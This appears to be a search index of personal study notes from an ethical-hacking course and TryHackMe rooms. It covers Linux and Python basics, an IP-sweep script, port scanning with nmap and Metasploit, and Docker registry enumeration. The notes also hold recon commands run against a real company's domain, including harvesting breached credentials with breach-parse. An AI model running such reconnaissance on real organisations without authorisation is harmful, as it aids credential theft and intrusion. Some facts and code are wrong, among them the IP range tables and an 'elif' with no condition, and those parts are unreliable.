mentioned name. 6. Scripting with Bash Let's make a script to grab the IP address after a successful ping 6.1. Command to extract only the IP after the ping $ ping 192 .168.4.29 -c 1 > ip.txt $ cat ip.txt PING 192 .168.4.29 ( 192 .168.4.29 ) 56 ( 84 ) bytes of data. 64 bytes from 192 .168.4.29: icmp_seq = 1 ttl = 64 time = 0 .028 ms --- 192 .168.4.29 ping statistics --- 1 packets transmitted, 1 received, 0 % packet loss, time 0ms rtt min/avg/max/mdev = 0 .026/0.027/0.029/0.001 ms $ cat ip.txt | grep \"64 bytes\" 64 bytes from 192 .168.4.29: icmp_seq = 1 ttl = 64 time = 0 .028 ms $ cat ip.txt | grep \"64 bytes\" | cut -d \" \" -f 4 192 .168.4.29: $ cat ip.txt | grep \"64 bytes\" | cut -d \" \" -f 4 | tr -d \":\" 192 .168.4.29 6.2. The Script $ vim ipsweep.sh # Creates the file sweep.sh and opens vim editor The script should look like this : #!/bin/bash if [ \" $1 \" == \"\" ] then echo \"You forgot an IP address!\" echo \"Syntax : ./ipsweep.sh 192.168.1\" else for ip in ` seq 1 254 ` ; do ping -c 1 $1 . $ip | grep \"64 bytes\" | cut -d \" \" -f 4 | tr -d \":\" & done fi # When running the script, we also give the beginning of the IP address : $1 # \"&\" Allows to run multiple commands at the same time ipsweep.sh $ chmod +x ./ipsweep.sh # Allows us to execute the script $ ./ipsweep.sh 192 .168.1 192 .168.1.1 192 .168.1.22 192 .168.1.23 192 .168.1.24 192 .168.1.53 We can then put all of these IP addresses in a file, in order to help our scanning through nmap : $ ./ipsweep.sh 192 .168.1 > valid_ipaddress.txt $ for ip in $( cat valid_ipaddress.txt ) ; do nmap $ip ; done","title":"Introduction to Linux"},{"location":"practical_ethical_hacking/peh-linux/#introduction-to-linux","text":"","title":"Introduction to Linux"},{"location":"practical_ethical_hacking/peh-linux/#1-navigating-the-file-system","text":"$ pwd : Present working directory. $ cd /path/to/file : Change directory. $ ls -la : List everything in the folder, even hidden files $ mkdir /path/to/file : Make directory. $ rmdir /path/to/file : Remove directory. $ cp /path/to/source /path/to/destination : Copy file. $ rm /path/to/file : Remove file. $ mv /path/to/source /path/to/destination : Move file or rename it. $ locate <filename> : Locate a file. \\--> Use $ updatedb to refresh the database. $ echo \"something\" : Displays \"something\". $ <command> > /path/to/file : Writes the output of the command in the file. $ echo \"Hello World!\" > test.txt # Creates a file test.txt in the current directory with \"Hello World!\" written inside. $ man <command> : Manual page for that command.","title":"1. Navigating the File System"},{"location":"practical_ethical_hacking/peh-linux/#2-users-and-privileges","text":"When doing a ls -la we can see the file details. $ ls -la total 148 drwxr-xr-x 14 kali kali 4096 Mar 3 17 :16 . drwxr-xr-x 3 root root 4096 Jul 27 2020 .. -rwxr--r-- 1 walbert support 0 Oct 31 11 :06 test $ cat /etc/passwd to see users. $ passwd : Change password of the current user. $ cat /path/to/file : Displays the file in terminal. $ chmod 777 /path/to/file : Change mode (rwx) of the file. $ adduser <username> : Add a user \"username\". $ su <user> : Switch user. $ sudo <command> : Super User DO command. Sudoers file: anyone in there can use the sudo command.","title":"2. Users and Privileges"},{"location":"practical_ethical_hacking/peh-linux/#3-network-commands","text":"$ ifconfig : Shows the different network information. $ iwconfig : Wireless network information. $ ping <ip> : Sends ICMP packet (ping) to the given ip. $ arp -a : Shows the IP addresses talking to you and the MAC addresses associated. $ netstat -ano : Shows active connection on your machine (interesting during pentest to see if the machine is talking to another one). $ route : Prints the routing table. These are becoming deprecated, now the ip command is the goto : $ ip a : IP address, Network, Broadcast $ ip n : ARP table $ ip r : Routing table","title":"3. Network Commands"},{"location":"practical_ethical_hacking/peh-linux/#4-installing-and-updating-tools","text":"$ apt update && apt upgrade # Updates the system","title":"4. Installing and Updating tools"},{"location":"practical_ethical_hacking/peh-linux/#41-install-package","text":"$ apt install pip # Installs pip","title":"4.1. Install package"},{"location":"practical_ethical_hacking/peh-linux/#42-from-github","text":"$ cd /opt # Downloads in the opt file : good practice $ git clone https://github.com/username/repository.git # Clones the repository on the local machine","title":"4.2. From Github"},{"location":"practical_ethical_hacking/peh-linux/#43-install-gedit","text":"$ sudo apt install gedit $ gedit test.txt","title":"4.3. Install gedit"},{"location":"practical_ethical_hacking/peh-linux/#5-viewing-creating-and-editing-files","text":"$ echo \"test\" > test.txt # Overwrites a test.txt file with \"test\" inside $ cat test.txt test $ echo \"test2\" >> test.txt # Appends the echo standard output to the file test.txt $ cat test.txt test test2 $ touch /path/to/file : Creates an empty file with the mentioned name.","title":"5. Viewing, Creating and Editing Files"},{"location":"practical_ethical_hacking/peh-linux/#6-scripting-with-bash","text":"Let's make a script to grab the IP address after a successful ping","title":"6. Scripting with Bash"},{"location":"practical_ethical_hacking/peh-linux/#61-command-to-extract-only-the-ip-after-the-ping","text":"$ ping 192 .168.4.29 -c 1 > ip.txt $ cat ip.txt PING 192 .168.4.29 ( 192 .168.4.29 ) 56 ( 84 ) bytes of data. 64 bytes from 192 .168.4.29: icmp_seq = 1 ttl = 64 time = 0 .028 ms --- 192 .168.4.29 ping statistics --- 1 packets transmitted, 1 received, 0 % packet loss, time 0ms rtt min/avg/max/mdev = 0 .026/0.027/0.029/0.001 ms $ cat ip.txt | grep \"64 bytes\" 64 bytes from 192 .168.4.29: icmp_seq = 1 ttl = 64 time = 0 .028 ms $ cat ip.txt | grep \"64 bytes\" | cut -d \" \" -f 4 192 .168.4.29: $ cat ip.txt | grep \"64 bytes\" | cut -d \" \" -f 4 | tr -d \":\" 192 .168.4.29","title":"6.1. Command to extract only the IP after the ping"},{"location":"practical_ethical_hacking/peh-linux/#62-the-script","text":"$ vim ipsweep.sh # Creates the file sweep.sh and opens vim editor The script should look like this : #!/bin/bash if [ \" $1 \" == \"\" ] then echo \"You forgot an IP address!\" echo \"Syntax : ./ipsweep.sh 192.168.1\" else for ip in ` seq 1 254 ` ; do ping -c 1 $1 . $ip | grep \"64 bytes\" | cut -d \" \" -f 4 | tr -d \":\" & done fi # When running the script, we also give the beginning of the IP address : $1 # \"&\" Allows to run multiple commands at the same time ipsweep.sh $ chmod +x ./ipsweep.sh # Allows us to execute the script $ ./ipsweep.sh 192 .168.1 192 .168.1.1 192 .168.1.22 192 .168.1.23 192 .168.1.24 192 .168.1.53 We can then put all of these IP addresses in a file, in order to help our scanning through nmap : $ ./ipsweep.sh 192 .168.1 > valid_ipaddress.txt $ for ip in $( cat valid_ipaddress.txt ) ; do nmap $ip ; done","title":"6.2. The Script"},{"location":"practical_ethical_hacking/peh-networking/","text":"Networking Refresher 1. IP Addresses Display IP address in Linux : $ ifconfig We communicate over Layer 3 ( Router ) NAT \\(\\to\\) Network Address Translation 1.2. Private IP addresses Network class Network numbers Network mask Number of networks Number of hosts per network Class A 10 .0.0.0 255.0.0.0 126 16,646,144 Class B 172.16 .0.0 to 172.32 .0.0 255.255.0.0 16,383 65,024 Class C 192.168 .0.0 to 192.168.255.255 255.255.255.0 2,097,151 254 Loopback 127.0.0.1 to 127.0.0.7 255.255.255.255 - - 2. MAC Addresses MAC \\(\\to\\) Media Access Control NIC \\(\\to\\) Network Interface Card Mac address lookup : first 3 pairs are identifiers Layer 2 , related to switching ( Switch ) 3. TCP, UDP and the Three-Way Hanshake Layer 4 TCP \\(\\to\\) Transmission Control protocol UDP \\(\\to\\) User Datagram Protocol 3.1. TCP 3-way handshake 4. Common ports and protocols 65,535 ports total \\(\\to\\) 1024 \" well-known \" ports FTP \\(\\to\\) File Transfer Protocol Telnet \\(\\to\\) Log remotely to a machine SSH \\(\\to\\) Secure SHell (encrypted telnet) SMTP , IMAP , POP3 \\(\\to\\) all relate to mail DNS \\(\\to\\) Domain Name System SMB \\(\\to\\) File shares ( Samba ) SNMP \\(\\to\\) Simple Network Management Protocol TCP Protocol Port FTP 21 SSH 22 Telnet 23 SMTP 25 DNS 53 HTTP 80 HTTPS 443 POP3 110 SMB 139 + 445 IMAP 143 RDP 3389 UDP Protocol Port DNS 53 DHCP 67, 68 TFTP 69 SNMP 161 5. The OSI model Physical \\(\\to\\) data, cables, cat6 Data \\(\\to\\) Switching, MAC addresses Network \\(\\to\\) IP addresses, routing Transport \\(\\to\\) TCP/UDP Session \\(\\to\\) session management Presentation \\(\\to\\) WMV, JPEG, MOV Application \\(\\to\\) HTTP, SMTP 6. Subnetting Subnetting Cybermentor Excel Cheatsheet Link to site IP Address Guide","title":"Networking Refresher"},{"location":"practical_ethical_hacking/peh-networking/#networking-refresher","text":"","title":"Networking Refresher"},{"location":"practical_ethical_hacking/peh-networking/#1-ip-addresses","text":"Display IP address in Linux : $ ifconfig We communicate over Layer 3 ( Router ) NAT \\(\\to\\) Network Address Translation","title":"1. IP Addresses"},{"location":"practical_ethical_hacking/peh-networking/#12-private-ip-addresses","text":"Network class Network numbers Network mask Number of networks Number of hosts per network Class A 10 .0.0.0 255.0.0.0 126 16,646,144 Class B 172.16 .0.0 to 172.32 .0.0 255.255.0.0 16,383 65,024 Class C 192.168 .0.0 to 192.168.255.255 255.255.255.0 2,097,151 254 Loopback 127.0.0.1 to 127.0.0.7 255.255.255.255 - -","title":"1.2. Private IP addresses"},{"location":"practical_ethical_hacking/peh-networking/#2-mac-addresses","text":"MAC \\(\\to\\) Media Access Control NIC \\(\\to\\) Network Interface Card Mac address lookup : first 3 pairs are identifiers Layer 2 , related to switching ( Switch )","title":"2. MAC Addresses"},{"location":"practical_ethical_hacking/peh-networking/#3-tcp-udp-and-the-three-way-hanshake","text":"Layer 4 TCP \\(\\to\\) Transmission Control protocol UDP \\(\\to\\) User Datagram Protocol","title":"3. TCP, UDP and the Three-Way Hanshake"},{"location":"practical_ethical_hacking/peh-networking/#31-tcp-3-way-handshake","text":"","title":"3.1. TCP 3-way handshake"},{"location":"practical_ethical_hacking/peh-networking/#4-common-ports-and-protocols","text":"65,535 ports total \\(\\to\\) 1024 \" well-known \" ports FTP \\(\\to\\) File Transfer Protocol Telnet \\(\\to\\) Log remotely to a machine SSH \\(\\to\\) Secure SHell (encrypted telnet) SMTP , IMAP , POP3 \\(\\to\\) all relate to mail DNS \\(\\to\\) Domain Name System SMB \\(\\to\\) File shares ( Samba ) SNMP \\(\\to\\) Simple Network Management Protocol TCP Protocol Port FTP 21 SSH 22 Telnet 23 SMTP 25 DNS 53 HTTP 80 HTTPS 443 POP3 110 SMB 139 + 445 IMAP 143 RDP 3389 UDP Protocol Port DNS 53 DHCP 67, 68 TFTP 69 SNMP 161","title":"4. Common ports and protocols"},{"location":"practical_ethical_hacking/peh-networking/#5-the-osi-model","text":"Physical \\(\\to\\) data, cables, cat6 Data \\(\\to\\) Switching, MAC addresses Network \\(\\to\\) IP addresses, routing Transport \\(\\to\\) TCP/UDP Session \\(\\to\\) session management Presentation \\(\\to\\) WMV, JPEG, MOV Application \\(\\to\\) HTTP, SMTP","title":"5. The OSI model"},{"location":"practical_ethical_hacking/peh-networking/#6-subnetting","text":"Subnetting Cybermentor Excel Cheatsheet Link to site IP Address Guide","title":"6. Subnetting"},{"location":"practical_ethical_hacking/peh-post_exploitation/","text":"","title":"Peh post exploitation"},{"location":"practical_ethical_hacking/peh-python/","text":"Python Refresher Back to basics Variables two = 2 some_number = 10000 # Booleans true_boolean = True false_boolean = False # String my_name = \"This is a string\" # Float book_price = 15.80 Control Flow if 2 > 1 : print ( \"2 is greater than 1\" ) elif : print ( \"1 is not greater than 2\" ) else : print ( \"1 is equal to 2\" ) Loops # While : loop_condition = True while loop_condition : print ( \"Loop Condition keeps: %s \" % ( loop_condition )) loop_condition = False # For : for i in range ( 1 , 11 ): print ( i ) for item in list : print ( item ) Lists programming_languages = [ \"Python\" , \"C\" , \"Rust\" , \"Java\" , \"Go\" ] # Index are like this : 0 1 2 3 4 print ( programming_languages [ 2 ]) # Displays \"Rust\" # Let's add some variables to the list programming_languages . append ( \"JavaScript\" ) # Adds JS to the list above one_more = \"Kotlin\" programming_languages . append ( one_more ) # Adds Kotlin to the list print ( programming_languages [ 6 ]) # Displays \"Kotlin\" Dictionaries dictionary_example = { \"key1\" : \"value1\" , \"key2\" : 2 , 3 : \"val3\" } print ( \"The first value is %s \" % ( dictionary_example [ \"key1\" ])) # Displays value of key1 print ( \"The second value is \" + str ( dictionary_example [ \"key2\" ])) # Displays value of key2 print ( \"The second value is \" + dictionary_example [ 3 ]) # Displays value of key3 dictionary_example [ 'keyFour' ] = \"v4\" # Adds keyFour as the 4th key, with value or \"v4\" print ( dictionary_example ) # Displays whole dictionary # Display dictionary : for key , value in dictionary . items (): print ( \" %s takes the value %s \" % ( key , value )) # key_n takes the value value_n","title":"Introduction to Python"},{"location":"practical_ethical_hacking/peh-python/#python-refresher","text":"","title":"Python Refresher"},{"location":"practical_ethical_hacking/peh-python/#back-to-basics","text":"Variables two = 2 some_number = 10000 # Booleans true_boolean = True false_boolean = False # String my_name = \"This is a string\" # Float book_price = 15.80 Control Flow if 2 > 1 : print ( \"2 is greater than 1\" ) elif : print ( \"1 is not greater than 2\" ) else : print ( \"1 is equal to 2\" ) Loops # While : loop_condition = True while loop_condition : print ( \"Loop Condition keeps: %s \" % ( loop_condition )) loop_condition = False # For : for i in range ( 1 , 11 ): print ( i ) for item in list : print ( item ) Lists programming_languages = [ \"Python\" , \"C\" , \"Rust\" , \"Java\" , \"Go\" ] # Index are like this : 0 1 2 3 4 print ( programming_languages [ 2 ]) # Displays \"Rust\" # Let's add some variables to the list programming_languages . append ( \"JavaScript\" ) # Adds JS to the list above one_more = \"Kotlin\" programming_languages . append ( one_more ) # Adds Kotlin to the list print ( programming_languages [ 6 ]) # Displays \"Kotlin\" Dictionaries dictionary_example = { \"key1\" : \"value1\" , \"key2\" : 2 , 3 : \"val3\" } print ( \"The first value is %s \" % ( dictionary_example [ \"key1\" ])) # Displays value of key1 print ( \"The second value is \" + str ( dictionary_example [ \"key2\" ])) # Displays value of key2 print ( \"The second value is \" + dictionary_example [ 3 ]) # Displays value of key3 dictionary_example [ 'keyFour' ] = \"v4\" # Adds keyFour as the 4th key, with value or \"v4\" print ( dictionary_example ) # Displays whole dictionary # Display dictionary : for key , value in dictionary . items (): print ( \" %s takes the value %s \" % ( key , value )) # key_n takes the value value_n","title":"Back to basics"},{"location":"practical_ethical_hacking/peh-recon/","text":"Information Gathering (Reconnaissance) 1. Passive reconnaissance overview Quick review of Physical / Social : Location Information : Satellite images Drone recon Building layout (badge readers, break areas, security, fencing) Job Information : Employees (name, job title, phone number, manager, etc...) Pictures (badgephotos, desk photos...) Web/Host Target Validation : WHOIS, nslookup, dnsrecon Finding Subdomains : Google Fu, dig, Nmap, Sublist3r, Bluto, crt.sh, etc... Fingerprinting : Nmap, Wappalyzer, WhatWeb, BuiltWith, Netcat Data Breaches : HIBP, Breach-Parse, WeLeakInfo 1.1. Email address gathering and testing Hunter.io : Search for email addresses, and compare through LinkedIn Phonebook.cz : domains/email/urls voilanorbert.com : same Clearbit on Chrome emailhippo : test the found email addresses email-checker.net : same 1.2. gathering breached credentials with breach-parse breach-parse : https://github.com/hmaverickadams/breach-parse Install breach-parse and run as the following example : $ cd /opt/Breach-Parse $ ./breach-parse.sh @tesla.com tesla.txt Extracting usernames... Extracting passwords... theharvester : https://github.com/laramies/theHarvester (default kali integrated) Some ressources require API keys (as Hunter.io) flag description -d domain -l lines; number of results -b what to search on $ theharvester -d tesla.com -l 500 -b google dehashed.com : https://dehashed.com/ 1.3. Hunting subdomains sublist3r : install sudo apt install sublist3r run sublist3r -d tesla.com crt.sh : search engine %.tesla.com (certificate fingerprinting) Amass : ( github ) For each result, use Tomnomnom's httprobe tool to see if the site is alive. (github) 1.4. Identifying website technologies BuiltWith.com wappalyzer : add to firefox, browse the site and use the extension. whatweb : $ whatweb https://tesla.com 1.5. BurpSuite Install process : install and run setup foxyproxy surf the web and let the magic happen 1.6. Google Fu site:tesla.com -www filetype:csv Google Fu learning : site 1.7. Social Media LinkedIn to get people working for the site, hunter.io to get the email address format --> list of used email addresses.","title":"Information Gathering"},{"location":"practical_ethical_hacking/peh-recon/#information-gathering-reconnaissance","text":"","title":"Information Gathering (Reconnaissance)"},{"location":"practical_ethical_hacking/peh-recon/#1-passive-reconnaissance-overview","text":"Quick review of Physical / Social : Location Information : Satellite images Drone recon Building layout (badge readers, break areas, security, fencing) Job Information : Employees (name, job title, phone number, manager, etc...) Pictures (badgephotos, desk photos...) Web/Host Target Validation : WHOIS, nslookup, dnsrecon Finding Subdomains : Google Fu, dig, Nmap, Sublist3r, Bluto, crt.sh, etc... Fingerprinting : Nmap, Wappalyzer, WhatWeb, BuiltWith, Netcat Data Breaches : HIBP, Breach-Parse, WeLeakInfo","title":"1. Passive reconnaissance overview"},{"location":"practical_ethical_hacking/peh-recon/#11-email-address-gathering-and-testing","text":"Hunter.io : Search for email addresses, and compare through LinkedIn Phonebook.cz : domains/email/urls voilanorbert.com : same Clearbit on Chrome emailhippo : test the found email addresses email-checker.net : same","title":"1.1. Email address gathering and testing"},{"location":"practical_ethical_hacking/peh-recon/#12-gathering-breached-credentials-with-breach-parse","text":"breach-parse : https://github.com/hmaverickadams/breach-parse Install breach-parse and run as the following example : $ cd /opt/Breach-Parse $ ./breach-parse.sh @tesla.com tesla.txt Extracting usernames... Extracting passwords... theharvester : https://github.com/laramies/theHarvester (default kali integrated) Some ressources require API keys (as Hunter.io) flag description -d domain -l lines; number of results -b what to search on $ theharvester -d tesla.com -l 500 -b google dehashed.com : https://dehashed.com/","title":"1.2. gathering breached credentials with breach-parse"},{"location":"practical_ethical_hacking/peh-recon/#13-hunting-subdomains","text":"sublist3r : install sudo apt install sublist3r run sublist3r -d tesla.com crt.sh : search engine %.tesla.com (certificate fingerprinting) Amass : ( github ) For each result, use Tomnomnom's httprobe tool to see if the site is alive. (github)","title":"1.3. Hunting subdomains"},{"location":"practical_ethical_hacking/peh-recon/#14-identifying-website-technologies","text":"BuiltWith.com wappalyzer : add to firefox, browse the site and use the extension. whatweb : $ whatweb https://tesla.com","title":"1.4. Identifying website technologies"},{"location":"practical_ethical_hacking/peh-recon/#15-burpsuite","text":"Install process : install and run setup foxyproxy surf the web and let the magic happen","title":"1.5. BurpSuite"},{"location":"practical_ethical_hacking/peh-recon/#16-google-fu","text":"site:tesla.com -www filetype:csv Google Fu learning : site","title":"1.6. Google Fu"},{"location":"practical_ethical_hacking/peh-recon/#17-social-media","text":"LinkedIn to get people working for the site, hunter.io to get the email address format --> list of used email addresses.","title":"1.7. Social Media"},{"location":"practical_ethical_hacking/peh-report_writing/","text":"","title":"Peh report writing"},{"location":"practical_ethical_hacking/peh-scanning_enumeration/","text":"Scanning & Enumeration kioptrix john / TwoCows2 1. Nmap $ IP = <insert IP address> $ nmap -T4 -p- -vv -A $IP Starting Nmap 7 .91 ... Discovery of ports : 22, 80, 111, 139, 443, 32768 2. Ports review 2.1. Port 80 open $ nikto -h http:// $IP - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192 .168.0.82 Discovery of a cve : CVE-2002-0082 2.2. Port 139 open metasploit $ msfconsole =[ metasploit v6.0.52-dev ] + -- -- =[ 2147 exploits - 1143 auxiliary - 365 post ] + -- -- =[ 592 payloads - 45 encoders - 10 nops ] + -- -- =[ 8 evasion ] msf6 > search smb_version XX auxiliary/scanner/smb/smb_version ... msf6 > use auxiliary/scanner/smb/smb_version msf6 auxiliary ( scanner/smb/smb_version ) > set RHOSTS 192 .168.0.82 RHOSTS = > 192 .168.0.82 msf6 auxiliary ( scanner/smb/smb_version ) > run [ * ] 192 .168.0.82:139 - SMB Detected ( versions: ) ( preferred dialect: ) ( signatures:optional ) [ * ] 192 .168.0.82:139 - Host could not be identified: Unix ( Samba 2 .2.1a ) [ * ] 192 .168.0.82: - Scanned 1 of 1 hosts ( 100 % complete ) [ * ] Auxiliary module execution completed 2.3. Port 22 open $ ssh 192 .168.0.82 -oKexAlgorithms = +diffie-hellman-group1-sha1 -c aes128-cbc No banner. 3. Vulnerabilities Research Search for the findings with the versions and potentially exploits. 4. More Port Scanners 4.1. Masscan $ masscan -p1-65535 192 .168.0.82 Slower than nmap, but displays the ports when found so no need to wait until the end to start. 4.2. Metasploit msf6 > use auxiliary/scanner/portscan/syn msf6 auxiliary ( scanner/portscan/syn ) > set rhosts 192 .168.0.82 msf6 auxiliary ( scanner/portscan/syn ) > use 4.3. Nessus","title":"Scanning & Enumeration"},{"location":"practical_ethical_hacking/peh-scanning_enumeration/#scanning-enumeration","text":"kioptrix john / TwoCows2","title":"Scanning &amp; Enumeration"},{"location":"practical_ethical_hacking/peh-scanning_enumeration/#1-nmap","text":"$ IP = <insert IP address> $ nmap -T4 -p- -vv -A $IP Starting Nmap 7 .91 ... Discovery of ports : 22, 80, 111, 139, 443, 32768","title":"1. Nmap"},{"location":"practical_ethical_hacking/peh-scanning_enumeration/#2-ports-review","text":"","title":"2. Ports review"},{"location":"practical_ethical_hacking/peh-scanning_enumeration/#21-port-80-open","text":"$ nikto -h http:// $IP - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192 .168.0.82 Discovery of a cve : CVE-2002-0082","title":"2.1. Port 80 open"},{"location":"practical_ethical_hacking/peh-scanning_enumeration/#22-port-139-open","text":"metasploit $ msfconsole =[ metasploit v6.0.52-dev ] + -- -- =[ 2147 exploits - 1143 auxiliary - 365 post ] + -- -- =[ 592 payloads - 45 encoders - 10 nops ] + -- -- =[ 8 evasion ] msf6 > search smb_version XX auxiliary/scanner/smb/smb_version ... msf6 > use auxiliary/scanner/smb/smb_version msf6 auxiliary ( scanner/smb/smb_version ) > set RHOSTS 192 .168.0.82 RHOSTS = > 192 .168.0.82 msf6 auxiliary ( scanner/smb/smb_version ) > run [ * ] 192 .168.0.82:139 - SMB Detected ( versions: ) ( preferred dialect: ) ( signatures:optional ) [ * ] 192 .168.0.82:139 - Host could not be identified: Unix ( Samba 2 .2.1a ) [ * ] 192 .168.0.82: - Scanned 1 of 1 hosts ( 100 % complete ) [ * ] Auxiliary module execution completed","title":"2.2. Port 139 open"},{"location":"practical_ethical_hacking/peh-scanning_enumeration/#23-port-22-open","text":"$ ssh 192 .168.0.82 -oKexAlgorithms = +diffie-hellman-group1-sha1 -c aes128-cbc No banner.","title":"2.3. Port 22 open"},{"location":"practical_ethical_hacking/peh-scanning_enumeration/#3-vulnerabilities-research","text":"Search for the findings with the versions and potentially exploits.","title":"3. Vulnerabilities Research"},{"location":"practical_ethical_hacking/peh-scanning_enumeration/#4-more-port-scanners","text":"","title":"4. More Port Scanners"},{"location":"practical_ethical_hacking/peh-scanning_enumeration/#41-masscan","text":"$ masscan -p1-65535 192 .168.0.82 Slower than nmap, but displays the ports when found so no need to wait until the end to start.","title":"4.1. Masscan"},{"location":"practical_ethical_hacking/peh-scanning_enumeration/#42-metasploit","text":"msf6 > use auxiliary/scanner/portscan/syn msf6 auxiliary ( scanner/portscan/syn ) > set rhosts 192 .168.0.82 msf6 auxiliary ( scanner/portscan/syn ) > use","title":"4.2. Metasploit"},{"location":"practical_ethical_hacking/peh-scanning_enumeration/#43-nessus","text":"","title":"4.3. Nessus"},{"location":"practical_ethical_hacking/peh-web_app/","text":"","title":"Peh web app"},{"location":"practical_ethical_hacking/peh-wireless_pentest/","text":"","title":"Peh wireless pentest"},{"location":"practical_ethical_hacking/practical_ethical_hacking/","text":"Practical Ethical Hacking by TheCyberMentor Summary 1 Networking Refresher 2 Introduction to Linux 3 Introduction to Python 4 Reconnaissance 5 Scanning & Enumeration 6 Exploitation Basics 7 Buffer Overflows 8 Active Directory 9 Post Exploitation 10 Web Application 11 Wireless Pentesting 12 Report Writing The Ethical Hacker Methodology : The five stages of ethical hacking First stage : Reconnaissance (information gathering) can be active or passive Second stage : Scanning and Enumeration Third stage : Exploitation (gaining access) Fourth stage : Maintaining Access Fifth stage : Covering Tracks Tools Passive Recon : Hunter.io - site breach-parse - github theharvester - github sublist3r crt.sh - site Amass - github httprobe - github BuiltWith.com - site wappalyzer whatweb - github BurpSuite Scanning & Enumeration : nmap nikto dirbuster / dirsearch Masscan Nessus Metasploit Exploitation : Metasploit Mindmap First things first : nmap -T4 -A -v -p- $IP Port 80 nikto $IP curl -I $IP Open browser Burpsuite","title":"Summary"},{"location":"practical_ethical_hacking/practical_ethical_hacking/#practical-ethical-hacking","text":"by TheCyberMentor","title":"Practical  Ethical  Hacking"},{"location":"practical_ethical_hacking/practical_ethical_hacking/#summary","text":"1 Networking Refresher 2 Introduction to Linux 3 Introduction to Python 4 Reconnaissance 5 Scanning & Enumeration 6 Exploitation Basics 7 Buffer Overflows 8 Active Directory 9 Post Exploitation 10 Web Application 11 Wireless Pentesting 12 Report Writing","title":"Summary"},{"location":"practical_ethical_hacking/practical_ethical_hacking/#the-ethical-hacker-methodology-the-five-stages-of-ethical-hacking","text":"First stage : Reconnaissance (information gathering) can be active or passive Second stage : Scanning and Enumeration Third stage : Exploitation (gaining access) Fourth stage : Maintaining Access Fifth stage : Covering Tracks","title":"The Ethical Hacker Methodology : The five stages of ethical hacking"},{"location":"practical_ethical_hacking/practical_ethical_hacking/#tools","text":"Passive Recon : Hunter.io - site breach-parse - github theharvester - github sublist3r crt.sh - site Amass - github httprobe - github BuiltWith.com - site wappalyzer whatweb - github BurpSuite Scanning & Enumeration : nmap nikto dirbuster / dirsearch Masscan Nessus Metasploit Exploitation : Metasploit","title":"Tools"},{"location":"practical_ethical_hacking/practical_ethical_hacking/#mindmap","text":"First things first : nmap -T4 -A -v -p- $IP","title":"Mindmap"},{"location":"practical_ethical_hacking/practical_ethical_hacking/#port-80","text":"nikto $IP curl -I $IP Open browser Burpsuite","title":"Port 80"},{"location":"thm_knowledge/docker/","text":"Docker Pentesting The Docker Rodeo room on TryHackMe 1. Intro to Docker ok see later 2. Vulnerabilities 2.1. Abusing a Docker Registry Discovery using Nmap Common Docker Registry port is 5000 : Query repositories using Postman Docker Registry is a JSON endpoint --> Postman Full Docker Registry Documentation We need to send a GET request to http://<example.com>:5000/v2/_catalog to list all the repositories registered on the registry. Note: repository/name Query tags of chosen app from repository Send a GET request to http://<example.com>:5000/v2/<repository>/<name>/tags/list to query all published tags. Get Manifest of chosen tag from chosen app from repository Send GET request to http://<example.com>:5000/v2/<repository>/<name>/manifests/<tag> Search in history for secrets ! :D 2.2. Reverse Engineering Docker Images Using Dive Github here Install Dive Get the image ID : docker images Dive into the image : dive <image_id> 2.2.1. Using Dive Layers (pictured in red): This window shows the various layers and stages the docker container has gone through Current Layer Contents (pictured in green): This window shows you the contents of the container's filesystem at the selected layer Layer Details (pictured in red): Shows miscellaneous information such as the ID of the layer and any command executed in the Dockerfile for that layer. Navigate the data within the current window using the \"Up\" and \"Down\" Arrow-keys. You can swap between the Windows using the \"Tab\" key.","title":"Docker Pentesting"},{"location":"thm_knowledge/docker/#docker-pentesting","text":"The Docker Rodeo room on TryHackMe","title":"Docker Pentesting"},{"location":"thm_knowledge/docker/#1-intro-to-docker","text":"ok see later","title":"1. Intro to Docker"},{"location":"thm_knowledge/docker/#2-vulnerabilities","text":"","title":"2. Vulnerabilities"},{"location":"thm_knowledge/docker/#21-abusing-a-docker-registry","text":"Discovery using Nmap Common Docker Registry port is 5000 : Query repositories using Postman Docker Registry is a JSON endpoint --> Postman Full Docker Registry Documentation We need to send a GET request to http://<example.com>:5000/v2/_catalog to list all the repositories registered on the registry. Note: repository/name Query tags of chosen app from repository Send a GET request to http://<example.com>:5000/v2/<repository>/<name>/tags/list to query all published tags. Get Manifest of chosen tag from chosen app from repository Send GET request to http://<example.com>:5000/v2/<repository>/<name>/manifests/<tag> Search in history for secrets ! :D","title":"2.1. Abusing a Docker Registry"},{"location":"thm_knowledge/docker/#22-reverse-engineering-docker-images","text":"Using Dive Github here Install Dive Get the image ID : docker images Dive into the image : dive <image_id>","title":"2.2. Reverse Engineering Docker Images"},{"location":"thm_knowledge/docker/#221-using-dive","text":"Layers (pictured in red): This window shows the various layers and stages the docker container has gone through Current Layer Contents (pictured in green): This window shows you the contents of the container's filesystem at the selected layer Layer Details (pictured in red): Shows miscellaneous information such as the ID of the layer and any command executed in the Dockerfile for that layer. Navigate the data within the current window using the \"Up\" and \"Down\" Arrow-keys. You can swap between the Windows using the \"Tab\" key.","title":"2.2.1. Using Dive"},{"location":"thm_knowledge/http/","text":"HTTP in detail from the TryHackMe room of the same name Infos HTTP (HyperText Transfer Protocol) is the set of rules used for communicating with web servers for the transmitting of webpage data, whether that is HTML, Images, Videos, etc... HTTPS (HyperText Transfer Protocol Secure) is encrypted HTTP , stopping people from seeing the data you are receiving or sending, but also giving you assurances that you're talking to the correct web server and not something impersonating it. URL A URL is predominantly an instruction on how to access a resource on the internet. Scheme : This instructs on what protocol to use for accessing the resource such as HTTP , HTTPS , FTP (File Transfer Protocol). User : Some services require authentication to log in, you can put a username and password into the URL to log in. Host : The domain name or IP address of the server you wish to access. Port : The Port that you are going to connect to, usually 80 for HTTP and 443 for HTTPS , but this can be hosted on any port between 1 - 65535. Path : The file name or location of the resource you are trying to access. Query String : Extra bits of information that can be sent to the requested path. For example, /blog?id=1 would tell the blog path that you wish to receive the blog article with the id of 1. Fragment : This is a reference to a location on the actual page requested. This is commonly used for pages with long content and can have a certain part of the page directly linked to it, so it is viewable to the user as soon as they access the page. Requests When communicating with a web server, we do requests in which we specify the method , the page , the protocol version , and other information gathered in the Headers such as the destination site (Host), the web browser used (User-Agent), the page that referred us to this one (Referer) and so on. Example request : GET / HTTP / 1.1 Host : tryhackme.com User-Agent : Mozilla/5.0 Firefox/87.0 Referer : https://tryhackme.com/ Notice that the HTTP requests always end with a blank line to inform the web server that the request has finished. Example response : HTTP / 1.1 200 OK Server : nginx/1.15.8 Date : Fri, 09 Apr 2021 13:34:03 GMT Content-Type : text/html Content-Length : 98 < html > < head > < title > This is a title </ title > 